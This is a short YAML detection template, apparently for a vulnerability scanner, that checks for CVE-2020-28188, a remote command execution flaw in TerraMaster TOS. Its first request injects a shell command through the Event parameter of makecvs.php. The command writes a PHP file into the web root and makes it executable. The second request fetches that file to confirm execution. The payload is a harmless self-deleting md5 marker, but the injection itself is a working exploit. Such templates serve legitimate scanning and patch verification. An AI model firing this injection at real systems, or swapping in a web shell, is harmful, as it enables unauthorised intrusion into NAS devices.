id: erramaster-tos-rce-cve-2020-28188

info:
    name: erramaster-tos-rce-cve-2020-28188
    author: Print1n
    severity: high

manual: true
transport: http
set:
    r1: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /include/makecvs.php?Event=http|echo%20"<?php%20echo%20md5({{r1}});unlink(__FILE__);?>"%20>>%20/usr/www/{{r1}}.php%20&&%20chmod%20755%20/usr/www/{{r1}}.php||
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("text/csv") && response.body.bcontains(bytes("Service,DateTime"))
    r1:
        request:
            cache: true
            method: GET
            path: /{{r1}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(r1)))
expression: r0() && r1()
